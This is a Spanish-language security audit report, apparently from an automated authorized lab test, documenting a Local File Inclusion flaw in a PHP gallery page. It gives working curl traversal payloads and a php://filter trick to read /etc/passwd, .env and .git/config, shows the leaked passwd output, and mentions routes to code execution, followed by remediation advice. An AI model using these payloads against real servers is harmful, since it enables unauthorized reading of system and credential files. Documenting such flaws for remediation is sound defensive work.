# Informe de auditoría: Local File Inclusion (LFI)

Fecha: 2026-04-27T08:15:57Z
Objetivo: http://web.dev.local:8081
Auditor: Entorno de laboratorio autorizado (Automatizado)

Resumen ejecutivo
-----------------
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`. Se logró leer el fichero del sistema `/etc/passwd`, confirmando acceso a archivos locales y catalogando la vulnerabilidad como explotada (impacto alto en confidencialidad de información local).

Detalles técnicos
-----------------
URL vulnerable:
- http://web.dev.local:8081/gallery.php?page=<payload>

Parámetro vulnerable:
- page (en gallery.php)

Comandos y herramientas utilizadas
----------------------------------
- Recon / enumeración de directorios:
  - gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt
  - dirb http://web.dev.local:8081 /usr/share/wordlists/dirb/common.txt

- Pruebas de LFI (curl):
  - curl -s -i 'http://web.dev.local:8081/gallery.php?page=about'
  - curl -s -i 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd'
  - curl -s -i 'http://web.dev.local:8081/gallery.php?page=../../../../.env'
  - curl -s -i 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd'
  - curl -s -i 'http://web.dev.local:8081/gallery.php?page=../../../../.git/config'

Payloads usados
---------------
- Traversal simple:
  - ../../../../etc/passwd
  - ../../../../.env
  - ../../../../.git/config

- php://filter (evitar interpretación y obtener base64):
  - php://filter/read=convert.base64-encode/resource=../../../../etc/passwd

Evidencias (salida relevante)
-----------------------------
- Resultado lectura directa de /etc/passwd (fragmento extraído):

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
... (contenido completo leído durante la prueba)

- php://filter devolvió contenido en base64 (decodificable) conteniendo el mismo /etc/passwd; esto corrobora que el wrapper php puede ser usado para eludir ciertos filtros y obtener contenido binario o no imprimible.

Comportamiento observado
------------------------
- El servidor responde con contenido HTML que incluye la salida directa del archivo solicitado cuando se usa la ruta de traversal. En algunos intentos, cuando el archivo no existe en la ruta intentada, la aplicación muestra mensajes de error con la ruta solicitada (divulgación de información/path disclosure).
- El parámetro `page` no valida o filtra adecuadamente rutas relativas ni wrappers de PHP.

Impacto
-------
- Lectura de archivos locales sensibles: confirmado (/etc/passwd).
- Divulgación de rutas absolutas y mensajes de error que facilitan enumeración adicional.
- Potencial de escalar a RCE mediante técnicas adicionales (log poisoning, inclusion de archivos controlados por el atacante, uso de /proc/self/environ, etc.) si existen vectores de escritura o logs que puedan ser controlados.

Intentos adicionales y notas sobre escalada
-----------------------------------------
- Se intentó leer `.env` y `.git/config` (resultado: `.env` no encontrado en la ruta probada; `.git/config` no encontrado, pero la aplicación revela la ruta en el mensaje de error). Si alguno de estos archivos existiera, podrían contener credenciales o información de despliegue.
- No se encontró (en esta sesión) `/etc/shadow` ni claves privadas (`id_rsa`), pero la capacidad de leer `/etc/passwd` indica que con persistencia y vectores de escritura adicionales podría intentarse exfiltrar más archivos sensibles.

Recomendaciones
---------------
1. Validar estrictamente el parámetro `page`: permitir solo valores esperados (whitelist) en lugar de concatenar rutas controladas por el usuario.
2. Usar rutas mapeadas en servidor (ej. mapear "about" -> about.php) y evitar incluir archivos directamente desde entrada del usuario.
3. Deshabilitar wrappers peligrosos y limitar funciones de PHP si no son necesarias.
4. Configurar manejo de errores para que no muestre paths ni información sensible (prod: display_errors=Off, log errors internamente).
5. Revisar el sistema para detectar archivos sensibles expuestos (.env, .git, backups) y protegerlos mediante permisos adecuados y ubicación fuera del árbol público.

Conclusión
----------
La aplicación presenta una vulnerabilidad LFI en `gallery.php?page` que permitió leer archivos locales del servidor (`/etc/passwd`) y emplear el wrapper `php://filter` para obtener contenido en base64. Se clasifica la vulnerabilidad como confirmada y explotada.


